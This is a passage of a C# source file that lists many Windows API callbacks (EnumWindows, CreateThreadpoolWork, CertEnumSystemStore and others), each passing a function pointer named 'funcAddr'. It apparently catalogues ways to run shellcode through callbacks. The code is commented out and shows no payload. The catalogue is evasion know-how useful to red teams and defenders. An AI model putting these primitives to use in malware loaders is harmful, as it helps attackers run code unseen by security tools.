            WriteOwner = 0x80000,
            Synchronize = 0x100000,

            StandardRightsRequired = 0xF0000,
            StandardRightsRead = ReadControl,
            StandardRightsWrite = ReadControl,
            StandardRightsExecute = ReadControl,
            StandardRightsAll = 0x1F0000,
            SpecificRightsAll = 0xFFFF,

            FILE_READ_DATA = 0x0001,        // file & pipe
            FILE_LIST_DIRECTORY = 0x0001,       // directory
            FILE_WRITE_DATA = 0x0002,       // file & pipe
            FILE_ADD_FILE = 0x0002,         // directory
            FILE_APPEND_DATA = 0x0004,      // file
            FILE_ADD_SUBDIRECTORY = 0x0004,     // directory
            FILE_CREATE_PIPE_INSTANCE = 0x0004, // named pipe
            FILE_READ_EA = 0x0008,          // file & directory
            FILE_WRITE_EA = 0x0010,         // file & directory
            FILE_EXECUTE = 0x0020,          // file
            FILE_TRAVERSE = 0x0020,         // directory
            FILE_DELETE_CHILD = 0x0040,     // directory
            FILE_READ_ATTRIBUTES = 0x0080,      // all
            FILE_WRITE_ATTRIBUTES = 0x0100,     // all

            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,

            SPECIFIC_RIGHTS_ALL = 0x00FFFF,
            FILE_ALL_ACCESS = StandardRightsRequired | Synchronize | 0x1FF,
            FILE_GENERIC_READ = StandardRightsRead | FILE_READ_DATA | FILE_READ_ATTRIBUTES | FILE_READ_EA | Synchronize,
            FILE_GENERIC_WRITE = StandardRightsWrite | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | Synchronize,
            FILE_GENERIC_EXECUTE = StandardRightsExecute | FILE_READ_ATTRIBUTES | FILE_EXECUTE | Synchronize
        }

        const int FILE_SHARE_READ = 1;
        const int CREATE_NEW = 1;
        const int CREATE_ALWAYS = 2;
        const int OPEN_EXISTING = 3;
        const uint GENERIC_READ = (0x80000000);
        const uint FILE_FLAG_BACKUP_SEMANTICS = 0x02000000;
        const short FILE_ATTRIBUTE_NORMAL = 0x80;
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        private const uint FILE_FLAG_OVERLAPPED = 0x40000000;

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile(
             string filename,
             uint access,
             int share,
             IntPtr securityAttributes, // optional SECURITY_ATTRIBUTES struct or IntPtr.Zero
             int creationDisposition,
             short flagsAndAttributes,
             IntPtr templateFile
        );

        [DllImport("kernel32.dll")]
        static extern bool WriteFileEx(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,

            [In] ref System.Threading.NativeOverlapped lpOverlapped,
            IntPtr lpCompletionRoutine
        );

        [DllImport("kernel32.dll")]
        static extern int SleepEx(
             UInt32 dwMilliseconds,
             bool bAlertable
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(
           IntPtr hObject
        );
        */

        //[72]
        //PdhBrowseCounters
        /*
        [Flags]
        public enum BrowseFlag
        {
            bIncludeInstanceIndex = 1 << 0,
            bSingleCounterPerAdd = 1 << 1,
            bSingleCounterPerDialog = 1 << 2,
            bLocalCountersOnly = 1 << 3,
            bWildCardInstances = 1 << 4,
            bHideDetailBox = 1 << 5,
            bInitializePath = 1 << 6,
            bDisableMachineSelection = 1 << 7,
            bIncludeCostlyObjects = 1 << 8,
            bShowObjectBrowser = 1 << 9,
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct PDH_BROWSE_DLG_CONFIG
        {
            public BrowseFlag Flags;
            public IntPtr hWndOwner;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string szDataSource;
            public IntPtr szReturnPathBuffer;
            public uint cchReturnPathLength;
            public IntPtr pCallBack;
            public IntPtr dwCallBackArg;
            public uint CallBackStatus;
            public uint dwDefaultDetailLevel;

            [MarshalAs(UnmanagedType.LPTStr)]
            public string szDialogBoxCaption;
            public IntPtr CounterPaths;
        }

        [DllImport("Pdh.dll")]
        static extern bool PdhBrowseCounters(
            ref PDH_BROWSE_DLG_CONFIG pBrowseDlgData
        );
        */

        static void Main(string[] args)
        {
            //[00]
            //acmDriverEnum
            /*
            acmDriverEnum(
                funcAddr,
                0,
                0
            );
            */

            //[01]
            //acmFormatTagEnum
            /*
            AcmFormatTagDetails sACMFilter = new AcmFormatTagDetails();
            sACMFilter.structureSize = (uint)Marshal.SizeOf(sACMFilter);

            acmFormatTagEnum(
                IntPtr.Zero,
                ref sACMFilter,
                funcAddr,
                IntPtr.Zero,
                0
            );
            */

            //[02]
            //BindImageEx
            /*
            BindImageEx(
                BINDOPTS.BIND_NO_UPDATE,
                "C:\\windows\\notepad.exe",
                "",
                "",
                funcAddr
            );
            */

            //[03]
            //CallWindowProc
            //CallWindowProcA
            //CallWindowProcW
            /*
            CallWindowProc(
                funcAddr,
                0,
                0,
                0,
                0
            );

            CallWindowProcA(
                funcAddr,
                0,
                0,
                0,
                0
            );

            CallWindowProcW(
                funcAddr,
                0,
                0,
                0,
                0
            );
            */

            //[04]
            //CDefFolderMenu_Create2
            /*
            IntPtr ICM = IntPtr.Zero;
            CDefFolderMenu_Create2(
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                IntPtr.Zero,
                funcAddr,
                0,
                IntPtr.Zero,
                out ICM
            );
            */

            //[05]
            //CertCreateContext
            /*
            CERT_CREATE_CONTEXT_PARA sCertCreate = new CERT_CREATE_CONTEXT_PARA();
            sCertCreate.cbSize = (uint)Marshal.SizeOf(sCertCreate);
            sCertCreate.pfnFree = funcAddr;

            byte pbEn = new byte { };

            CertCreateContext(
                CERT_STORE_CERTIFICATE_CONTEXT,
                X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                ref pbEn,
                0,
                CERT_CREATE_CONTEXT_NOCOPY_FLAG,
                ref sCertCreate
            );
            */

            //[06]
            //CertEnumPhysicalStore
            /*
            CertEnumPhysicalStore(
                "My",
                CERT_SYSTEM_STORE_LOCAL_MACHINE,
                0,
                funcAddr
            );
            */

            //[07]
            //CertEnumSystemStore
            /*
            CertEnumSystemStore(
                CERT_SYSTEM_STORE_CURRENT_USER,
                IntPtr.Zero,
                IntPtr.Zero,
                funcAddr
            );
            */

            //[08]
            //CertEnumSystemStoreLocation
            /*
            CertEnumSystemStoreLocation(
                0,
                IntPtr.Zero,
                funcAddr
            );
            */

            //[09]
            //ChooseColor
            /*
            uint CC_ENABLEHOOK = 0x10;

            CHOOSECOLOR sCC = new CHOOSECOLOR();
            sCC.lStructSize = (uint)Marshal.SizeOf(sCC);
            sCC.Flags = CC_ENABLEHOOK;
            sCC.lpfnHook = funcAddr;

            ChooseColor(
                ref sCC
            );
            */

            //[0A]
            //ChooseFont
            /*
            int CF_ENABLEHOOK = 0x8;

            CHOOSEFONT sCF = new CHOOSEFONT();
            sCF.lStructSize = Marshal.SizeOf(sCF);
            sCF.Flags = CF_ENABLEHOOK;
            sCF.lpfnHook = funcAddr;

            ChooseFont(
                ref sCF
            );
            */

            //[0B]
            //ClusWorkerCreate
            /*
            CLUS_WORKER sCW = new CLUS_WORKER();
            ClusWorkerCreate(
                out sCW,
                funcAddr,
                IntPtr.Zero
            );

            uint INFINITE = 0xffffffff;
            ClusWorkerTerminateEx(
                ref sCW,
                INFINITE,
                true
            );
            */

            //[0C]
            //CopyFile2
            /*
            COPYFILE2_EXTENDED_PARAMETERS param = new COPYFILE2_EXTENDED_PARAMETERS();
            param.dwSize = (uint)Marshal.SizeOf(param);
            param.dwCopyFlags = (uint)CopyFileFlags.COPY_FILE_FAIL_IF_EXISTS;
            param.pfCancel = IntPtr.Zero;
            param.pProgressRoutine = funcAddr;
            param.pvCallbackContext = IntPtr.Zero;

            DeleteFileW(
                "C:\\Windows\\Temp\\backup.log"
            );

            CopyFile2(
                "C:\\Windows\\DirectX.log",
                "C:\\Windows\\Temp\\backup.log",
                ref param
            );
            */

            //[0D]
            //CopyFileEx
            /*
            DeleteFileW(
                "C:\\Windows\\Temp\\backup.log"
            );
            Int32 s = 0;
            bool success = CopyFileEx(
                "C:\\Windows\\system32\\cmd.exe", // File MUST be exist
                "C:\\Windows\\Temp\\backup.log",
                funcAddr,
                IntPtr.Zero,
                ref s,
                CopyFileFlags.COPY_FILE_FAIL_IF_EXISTS
            );
            */

            //[0E]
            //CreateDialogIndirectParam
            //CreateDialogIndirectParamA
            //CreateDialogIndirectParamW
            /*
            DlgTemplate DT = new DlgTemplate();
            CreateDialogIndirectParam(
                IntPtr.Zero,
                ref DT,
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero
            );
            CreateDialogIndirectParamA(
                IntPtr.Zero,
                ref DT,
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero
            );
            CreateDialogIndirectParamW(
                IntPtr.Zero,
                ref DT,
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[0F]
            //CreateThread
            /*
            IntPtr hThread = CreateThread(
                IntPtr.Zero,
                0,
                funcAddr,
                IntPtr.Zero,
                0,
                IntPtr.Zero
            );
            WaitForSingleObject(
                hThread,
                0xFFFFFFFF
            );
            */

            //[10]
            //CreateThreadpoolTimer
            /*
            LargeInteger lDueTime = new LargeInteger();
            FILETIME sFiletime = new FILETIME();
            lDueTime.QuadPart = -(10000000);
            sFiletime.DateTimeLow = (uint)lDueTime.Low;
            sFiletime.DateTimeHigh = (uint)lDueTime.High;

            IntPtr TPTimer = CreateThreadpoolTimer(
                funcAddr,
                IntPtr.Zero,
                IntPtr.Zero
            );
            SetThreadpoolTimer(
                TPTimer,
                ref sFiletime,
                0,
                0
            );
            System.Threading.Thread.Sleep(1500);
            WaitForThreadpoolTimerCallbacks(
                TPTimer,
                false
            );

            if (TPTimer != IntPtr.Zero)
                CloseThreadpoolTimer(
                    TPTimer
                );
            */

            //[11]
            //CreateThreadpoolWait
            /*
            HANDLE hEvent;
            hEvent = CreateEvent(
                IntPtr.Zero,
                false,
                false,
                ""
            );

            IntPtr ptp_w = CreateThreadpoolWait(
                funcAddr,
                0,
                0
            );

            SetThreadpoolWait(
                ptp_w,
                hEvent,
                IntPtr.Zero
            );

            SetEvent(hEvent);
            WaitForSingleObject(
                hEvent,
                0xFFFFFFFF
            );
            SetEvent(hEvent);
            */

            //[12]
            //CreateThreadpoolWork
            /*
            IntPtr TPWork = CreateThreadpoolWork(
                funcAddr,
                IntPtr.Zero,
                IntPtr.Zero
            );
            SubmitThreadpoolWork(
                TPWork
            );

            WaitForThreadpoolWorkCallbacks(
                TPWork,
                false
            );

            if (TPWork != IntPtr.Zero)
                CloseThreadpoolWork(TPWork);
            */

            //[13]
            //CreateTimerQueueTimer
            /*
            HANDLE timer;
            HANDLE queue = CreateTimerQueue();
            HANDLE gDoneEvent = CreateEvent(
                IntPtr.Zero,
                true,
                false,
                "test"
            );
            CreateTimerQueueTimer(
                out timer,
                queue,
                funcAddr,
                IntPtr.Zero,
                100,
                0,
                0
            );
            WaitForSingleObject(
                gDoneEvent,
                INFINITE
            );
            */

            //[14]
            //CryptEnumOIDFunction
            /*
            CryptEnumOIDFunction(
                CRYPT_MATCH_ANY_ENCODING_TYPE,
                "",
                "",
                0,
                IntPtr.Zero,
                funcAddr
            );
            */

            //[15]
            //CryptEnumOIDInfo
            /*
            CryptEnumOIDInfo(
                0,
                0,
                IntPtr.Zero,
                funcAddr
            );
            */

            //[16]
            //DbgHelpCreateUserDump
            //DbgHelpCreateUserDumpW
            /*
            DbgHelpCreateUserDump(
                "C:\\Users\\Public\\test.txt",
                funcAddr,
                0
            );
            DbgHelpCreateUserDumpW(
                "C:\\Users\\Public\\test.txt",
                funcAddr,
                0
            );
            */

            //[17]
            //DdeInitialize
            //DdeInitializeA
            //DdeInitializeW
            /*
            uint idInst = 0;
            DdeInitialize(
                ref idInst,
                funcAddr,
                DDE_INITIALIZE_COMMAND.MF_CALLBACKS,
                0
            );
            DdeInitializeA(
                ref idInst,
                funcAddr,
                DDE_INITIALIZE_COMMAND.MF_CALLBACKS,
                0
            );
            DdeInitializeW(
                ref idInst,
                funcAddr,
                DDE_INITIALIZE_COMMAND.MF_CALLBACKS,
                0
            );

            DdeConnect(
                idInst,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero
            );
            */

            //[18]
            //DialogBoxIndirectParam
            //DialogBoxIndirectParamA
            //DialogBoxIndirectParamW
            /*
            DlgTemplate DT = new DlgTemplate();
            DialogBoxIndirectParam(
                IntPtr.Zero,
                ref DT,
                IntPtr.Zero,
                funcAddr,
                0
            );
            DialogBoxIndirectParamA(
                IntPtr.Zero,
                ref DT,
                IntPtr.Zero,
                funcAddr,
                0
            );
            DialogBoxIndirectParamW(
                IntPtr.Zero,
                ref DT,
                IntPtr.Zero,
                funcAddr,
                0
            );
            */

            //[19]
            //DirectDrawEnumerateEx
            //DirectDrawEnumerateExA
            //DirectDrawEnumerateExW
            /*
            DirectDrawEnumerateEx(
                funcAddr,
                IntPtr.Zero,
                0
            );
            DirectDrawEnumerateExA(
                funcAddr,
                IntPtr.Zero,
                0
            );
            DirectDrawEnumerateExW(
                funcAddr,
                IntPtr.Zero,
                0
            );
            */

            //[1A]
            //DirectSoundCaptureEnumerate
            //DirectSoundCaptureEnumerateA
            //DirectSoundCaptureEnumerateW
            /*
            DirectSoundCaptureEnumerate(
                funcAddr,
                IntPtr.Zero
            );
            DirectSoundCaptureEnumerateA(
                funcAddr,
                IntPtr.Zero
            );
            DirectSoundCaptureEnumerateW(
                funcAddr,
                IntPtr.Zero
            );
            */

            //[1B]
            //DirectSoundEnumerate
            //DirectSoundEnumerateA
            //DirectSoundEnumerateW
            /*
            DirectSoundEnumerate(
                funcAddr,
                IntPtr.Zero
            );
            DirectSoundEnumerateA(
                funcAddr,
                IntPtr.Zero
            );
            DirectSoundEnumerateW(
                funcAddr,
                IntPtr.Zero
            );
            */

            //[1C]
            //DnsStartMulticastQuery
            /*
            uint DNS_QUERY_REQUEST_VERSION1 = 0x1;
            ushort DNS_TYPE_ZERO = 0x0;
            UInt64 DNS_QUERY_STANDARD = 0x0;

            MDNS_QUERY_REQUEST sMDNS = new MDNS_QUERY_REQUEST();
            sMDNS.Version = DNS_QUERY_REQUEST_VERSION1;
            sMDNS.ulRefCount = 0;
            sMDNS.Query = "Wra7h"; //Doesn"t seem to matter
            sMDNS.QueryType = DNS_TYPE_ZERO;
            sMDNS.QueryOptions = DNS_QUERY_STANDARD;
            sMDNS.InterfaceIndex = 0;
            sMDNS.pQueryCallback = funcAddr;
            sMDNS.pQueryContext = IntPtr.Zero;
            sMDNS.ulResendCount = 0;
            sMDNS.fAnswerReceived = false;


            MDNS_QUERY_HANDLE sMDNSHandle = new MDNS_QUERY_HANDLE();

            DnsStartMulticastQuery(
                sMDNS,
                out sMDNSHandle
            );
            DnsStopMulticastQuery(
                ref sMDNSHandle
            );
            */

            //[1D]
            //DrawState
            //DrawStateA
            //DrawStateW
            /*
            IntPtr hDC = GetDC(IntPtr.Zero);
            DrawState(
                hDC,
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0,
                1,
                1,
                0   //DSS_MONO to ignore the second param
            );
            DrawStateA(
                hDC,
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0,
                1,
                1,
                0   //DSS_MONO to ignore the second param
            );
            DrawStateW(
                hDC,
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0,
                1,
                1,
                0   //DSS_MONO to ignore the second param
            );
            ReleaseDC(
                IntPtr.Zero,
                hDC
            );
            */

            //[1E]
            //DSA_EnumCallback
            /*
            IntPtr hDSA = DSA_Create(1, 1);
            DSA_InsertItem(
                hDSA,
                0x7fffffff,
                hDSA
            ); //Append
            DSA_EnumCallback(
                hDSA,
                funcAddr,
                IntPtr.Zero
            );
            DSA_Destroy(
                hDSA
            );
            */

            //[1F]
            //EnumCalendarInfo
            //EnumCalendarInfoA
            //EnumCalendarInfoW
            /*
            EnumCalendarInfo(
                funcAddr,
                LOCALE_USER_DEFAULT,
                ENUM_ALL_CALENDARS,
                CAL_SMONTHNAME1
            );
            EnumCalendarInfoA(
                funcAddr,
                LOCALE_USER_DEFAULT,
                ENUM_ALL_CALENDARS,
                CAL_SMONTHNAME1
            );
            EnumCalendarInfoW(
                funcAddr,
                LOCALE_USER_DEFAULT,
                ENUM_ALL_CALENDARS,
                CAL_SMONTHNAME1
            );
            */

            //[20]
            //EnumCalendarInfoEx
            /*
            EnumCalendarInfoEx(
                funcAddr,
                LOCALE_USER_DEFAULT,
                ENUM_ALL_CALENDARS,
                CAL_SMONTHNAME1
            );
            */

            //[21]
            //EnumChildWindows
            /*
            EnumChildWindows(
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[22]
            //EnumDateFormats
            //EnumDateFormatsA
            //EnumDateFormatsW
            /*
            EnumDateFormats(
                funcAddr,
                0,
                0
            );
            EnumDateFormatsA(
                funcAddr,
                0,
                0
            );
            EnumDateFormatsW(
                funcAddr,
                0,
                0
            );
            */

            //[23]
            //EnumDateFormatsEx
            /*
            EnumDateFormatsEx(
                funcAddr,
                0x0800,
                0
            );
            */

            //[24]
            //EnumDateFormatsExEx
            /*
            EnumDateFormatsExEx(
                funcAddr,
                string.Empty,
                GetDateFormatFlags.DATE_SHORTDATE,
                0
            );
            */

            //[25]
            //EnumDesktops
            //EnumDesktopsA
            //EnumDesktopsW
            /*
            EnumDesktops(
                GetProcessWindowStation(),
                funcAddr,
                IntPtr.Zero
            );
            EnumDesktopsA(
                GetProcessWindowStation(),
                funcAddr,
                IntPtr.Zero
            );
            EnumDesktopsW(
                GetProcessWindowStation(),
                funcAddr,
                IntPtr.Zero
            );
            */

            //[26]
            //EnumDesktopWindows
            /*
            EnumDesktopWindows(
                GetThreadDesktop(GetCurrentThreadId()),
                funcAddr,
                IntPtr.Zero
            );
            */

            //[27]
            //EnumDirTree
            //EnumDirTreeA
            //EnumDirTreeW
            /*
            SymInitialize(
                GetCurrentProcess(),
                string.Empty,
                false
            );
            EnumDirTree(
                GetCurrentProcess(),
                "C:\\Windows",
                "*.log",
                "",
                funcAddr,
                IntPtr.Zero
            );
            EnumDirTreeA(
                GetCurrentProcess(),
                "C:\\Windows",
                "*.log",
                "",
                funcAddr,
                IntPtr.Zero
            );
            EnumDirTreeW(
                GetCurrentProcess(),
                "C:\\Windows",
                "*.log",
                "",
                funcAddr,
                IntPtr.Zero
            );
            */

            //[28]
            //EnumDisplayMonitors
            /*
            EnumDisplayMonitors(
                IntPtr.Zero,
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[29]
            //EnumerateLoadedModules
            //EnumerateLoadedModules64
            //EnumerateLoadedModulesW64
            /*
            EnumerateLoadedModules(
                GetCurrentProcess(),
                funcAddr,
                IntPtr.Zero
            );
            EnumerateLoadedModules64(
                GetCurrentProcess(),
                funcAddr,
                IntPtr.Zero
            );
            EnumerateLoadedModulesW64(
                GetCurrentProcess(),
                funcAddr,
                IntPtr.Zero
            );
            */

            //[2A]
            //EnumerateLoadedModulesEx
            //EnumerateLoadedModulesExW
            /*
            EnumerateLoadedModulesEx(
                GetCurrentProcess(),
                funcAddr,
                IntPtr.Zero
            );
            EnumerateLoadedModulesExW(
                GetCurrentProcess(),
                funcAddr,
                IntPtr.Zero
            );
            */

            //[2B]
            //EnumLanguageGroupLocales
            //EnumLanguageGroupLocalesA
            //EnumLanguageGroupLocalesW
            /*
            EnumLanguageGroupLocales(
                funcAddr,
                LGRPID.LGRPID_ARABIC,
                0,
                0
            );
            EnumLanguageGroupLocalesA(
                funcAddr,
                LGRPID.LGRPID_ARABIC,
                0,
                0
            );
            EnumLanguageGroupLocalesW(
                funcAddr,
                LGRPID.LGRPID_ARABIC,
                0,
                0
            );
            */

            //[2C]
            //EnumObjects
            /*
            IntPtr dc = GetDC(IntPtr.Zero);
            EnumObjects(
                dc,
                2,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[2D]
            //EnumPageFiles
            //EnumPageFilesA
            //EnumPageFilesW
            /*
            EnumPageFiles(
                funcAddr,
                IntPtr.Zero
            );
            EnumPageFilesA(
                funcAddr,
                IntPtr.Zero
            );
            EnumPageFilesW(
                funcAddr,
                IntPtr.Zero
            );
            */

            //[2E]
            //EnumProps
            /*
            IntPtr hWnd = IntPtr.Zero; //Enter handle value here. use UI Spy/Inspect to get it
            hWnd = GetTopWindow(IntPtr.Zero);
            EnumProps(
                hWnd,
                funcAddr
            );
            */

            //[2F]
            //EnumPropsEx
            //EnumPropsExA
            //EnumPropsExW
            /*
            IntPtr hWnd = IntPtr.Zero; //Enter handle value here. use UI Spy/Inspect to get it
            hWnd = GetTopWindow(IntPtr.Zero);
            EnumPropsEx(
                hWnd,
                funcAddr,
                IntPtr.Zero
            );
            EnumPropsExA(
                hWnd,
                funcAddr,
                IntPtr.Zero
            );
            EnumPropsExW(
                hWnd,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[30]
            //EnumPwrSchemes
            /*
            EnumPwrSchemes(
                funcAddr,
                0
            );
            */

            //[31]
            //EnumResourceTypes
            //EnumResourceTypesA
            //EnumResourceTypesW
            /*
            EnumResourceTypes(
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero
            );
            EnumResourceTypesA(
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero
            );
            EnumResourceTypesW(
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[32]
            //EnumResourceTypesEx
            //EnumResourceTypesExA
            //EnumResourceTypesExW
            /*
            EnumResourceTypesEx(
                IntPtr.Zero,
                funcAddr,
                0,
                RESOURCE_ENUM.RESOURCE_ENUM_VALIDATE,
                0
            );
            EnumResourceTypesExA(
                IntPtr.Zero,
                funcAddr,
                0,
                RESOURCE_ENUM.RESOURCE_ENUM_VALIDATE,
                0
            );
            EnumResourceTypesExW(
                IntPtr.Zero,
                funcAddr,
                0,
                RESOURCE_ENUM.RESOURCE_ENUM_VALIDATE,
                0
            );
            */

            //[33]
            //EnumSystemCodePages
            //EnumSystemCodePagesA
            //EnumSystemCodePagesW
            /*
            EnumSystemCodePages(
                funcAddr,
                0
            );
            EnumSystemCodePagesA(
                funcAddr,
                0
            );
            EnumSystemCodePagesW(
                funcAddr,
                0
            );
            */

            //[34]
            //EnumSystemGeoID
            /*
            EnumSystemGeoID(
                GEOCLASS_NATION,
                0,
                funcAddr
            );
            */

            //[35]
            //EnumSystemLanguageGroups
            //EnumSystemLanguageGroupsA
            //EnumSystemLanguageGroupsW
            /*
            EnumSystemLanguageGroups(
                funcAddr,
                0,
                0
            );
            EnumSystemLanguageGroupsA(
                funcAddr,
                0,
                0
            );
            EnumSystemLanguageGroupsW(
                funcAddr,
                0,
                0
            );
            */

            //[36]
            //EnumSystemLocales
            //EnumSystemLocalesA
            //EnumSystemLocalesW
            /*
            EnumSystemLocales(
                funcAddr,
                0
            );
            EnumSystemLocalesA(
                funcAddr,
                0
            );
            EnumSystemLocalesW(
                funcAddr,
                0
            );
            */

            //[37]
            //EnumSystemLocalesEx
            /*
            EnumSystemLocalesEx(
                funcAddr,
                LOCALETYPE.LOCALE_ALL,
                0,
                IntPtr.Zero
            );
            */

            //[38]
            //EnumThreadWindows
            /*
            EnumThreadWindows(
                0,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[39]
            //EnumTimeFormats
            //EnumTimeFormatsA
            //EnumTimeFormatsW
            /*
            EnumTimeFormats(
                funcAddr,
                0,
                0
            );
            EnumTimeFormatsA(
                funcAddr,
                0,
                0
            );
            EnumTimeFormatsW(
                funcAddr,
                0,
                0
            );
            */

            //[3A]
            //EnumTimeFormatsEx
            /*
            EnumTimeFormatsEx(
                funcAddr,
                LOCALE_NAME_SYSTEM_DEFAULT,
                TIME_FORMAT_FLAGS.TIME_NOSECONDS,
                IntPtr.Zero
            );
            */

            //[3B]
            //EnumUILanguages
            //EnumUILanguagesA
            //EnumUILanguagesW
            /*
            EnumUILanguages(
                funcAddr,
                MUI_LANGUAGE_ID,
                IntPtr.Zero
            );
            EnumUILanguagesA(
                funcAddr,
                MUI_LANGUAGE_ID,
                IntPtr.Zero
            );
            EnumUILanguagesW(
                funcAddr,
                MUI_LANGUAGE_ID,
                IntPtr.Zero
            );
            */

            //[3C]
            //EnumWindows
            /*
            EnumWindows(
                funcAddr,
                0
            );
            */

            //[3D]
            //EnumWindowStations
            //EnumWindowStationsA
            //EnumWindowStationsW
            /*
            EnumWindowStations(
                funcAddr,
                IntPtr.Zero
            );
            EnumWindowStationsA(
                funcAddr,
                IntPtr.Zero
            );
            EnumWindowStationsW(
                funcAddr,
                IntPtr.Zero
            );
            */

            //[3E]
            //EvtSubscribe_CVEEventWrite
            /*
            uint EvtSubscribeToFutureEvents = 1;
            IntPtr hEvent = EvtSubscribe(
                IntPtr.Zero,
                IntPtr.Zero,
                "Application",
                "*[System/EventID=1]",
                IntPtr.Zero,
                IntPtr.Zero,
                funcAddr,
                EvtSubscribeToFutureEvents
            );
            long test = CveEventWrite(
                "2022-123456",
                "Wra7h"
            );
            System.Threading.Thread.Sleep(10000);
            EvtClose(hEvent);
            */

            //[3F]
            //FCICreate
            /*
            IntPtr pErf = IntPtr.Zero;
            FCICreate(ref pErf,
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero
            );
            */

            //[40]
            //FindText
            /*
            uint FR_ENABLEHOOK = 0x100;
            FINDREPLACE sFR = new FINDREPLACE();
            sFR.lStructSize = (uint)Marshal.SizeOf(sFR);
            sFR.hwndOwner = GetForegroundWindow();
            sFR.Flags = FR_ENABLEHOOK;
            sFR.lpfnHook = funcAddr;
            sFR.lpstrFindWhat = "a";
            sFR.lpstrReplaceWith = "a";
            sFR.wReplaceWithLen = 1;
            sFR.wFindWhatLen = 1;

            FindText(
                ref sFR
            );
            */

            //[41]
            //FlsAlloc
            /*
            IntPtr dummy =  ConvertThreadToFiber(IntPtr.Zero);
            IntPtr dIndex = FlsAlloc(funcAddr);
            FlsSetValue(
                dIndex,
                dummy
            );
            */

            //[42]
            //GetOpenFileName
            /*
            int OFN_ENABLEHOOK = 0x00000020;
            int OFN_EXPLORER = 0x00080000;

            OpenFileName sOpenFileName = new OpenFileName();
            sOpenFileName.lStructSize = Marshal.SizeOf(sOpenFileName);
            sOpenFileName.nMaxFile = 260;
            sOpenFileName.Flags = OFN_ENABLEHOOK | OFN_EXPLORER;
            sOpenFileName.lpfnHook = funcAddr;

            GetOpenFileName(
                ref sOpenFileName
            );
            */

            //[43]
            //GetSaveFileName
            /*
            int OFN_ENABLEHOOK = 0x00000020;
            int OFN_EXPLORER = 0x00080000;

            OpenFileName sOpenFileName = new OpenFileName();
            sOpenFileName.lStructSize = Marshal.SizeOf(sOpenFileName);
            sOpenFileName.nMaxFile = 260;
            sOpenFileName.Flags = OFN_ENABLEHOOK | OFN_EXPLORER;
            sOpenFileName.lpfnHook = funcAddr;

            GetSaveFileName(
                ref sOpenFileName
            );
            */

            //[44]
            //GrayString
            //GrayStringA
            //GrayStringW
            /*
            IntPtr hDC = GetDC(IntPtr.Zero);
            GrayString(
                hDC,
                IntPtr.Zero,
                funcAddr,
                funcAddr,
                0,
                0,
                0,
                0,
                0
            );
            GrayStringA(
                hDC,
                IntPtr.Zero,
                funcAddr,
                funcAddr,
                0,
                0,
                0,
                0,
                0
            );
            GrayStringW(
                hDC,
                IntPtr.Zero,
                funcAddr,
                funcAddr,
                0,
                0,
                0,
                0,
                0
            );
            ReleaseDC(
                IntPtr.Zero,
                hDC
            );
            */

            //[45]
            //ImageGetDigestStream
            /*
            HANDLE hImg = CreateFileW(
                "C:\\Windows\\System32\\ntdll.dll",
                (uint)EFileAccess.GENERIC_READ,
                FILE_SHARE_READ,
                IntPtr.Zero,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                IntPtr.Zero
            );
            IntPtr _out = IntPtr.Zero;
            bool ok = ImageGetDigestStream(
                hImg,
                0x04,
                funcAddr,
                _out
            );
            CloseHandle(
                _out
            );
            CloseHandle(
                hImg
            );
            */

            //[46]
            //ImmEnumInputContext
            /*
            ImmEnumInputContext(
                0,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[47]
            //InitOnceExecuteOnce
            /*
            IntPtr outContext = IntPtr.Zero;
            InitOnce initOnce = new InitOnce();
            InitOnceExecuteOnce(
                ref initOnce,
                funcAddr,
                IntPtr.Zero,
                out outContext
            );
            */

            //[48]
            //InternetSetStatusCallback
            /*
            int INTERNET_OPEN_TYPE_DIRECT = 1;
            int INTERNET_FLAG_OFFLINE = 0x1000000;
            IntPtr hSession = InternetOpen(
                string.Empty,
                INTERNET_OPEN_TYPE_DIRECT,
                string.Empty,
                string.Empty,
                INTERNET_FLAG_OFFLINE
            );

            InternetSetStatusCallback(
                hSession,
                funcAddr
            );

            short INTERNET_DEFAULT_HTTPS_PORT = 443;
            int INTERNET_SERVICE_HTTP = 3;
            IntPtr hInternet = InternetConnect(
                hSession,
                "localhost",
                INTERNET_DEFAULT_HTTPS_PORT,
                string.Empty,
                string.Empty,
                INTERNET_SERVICE_HTTP,
                0,
                (IntPtr)1
            );

            InternetCloseHandle(
                hSession
            );
            InternetCloseHandle(
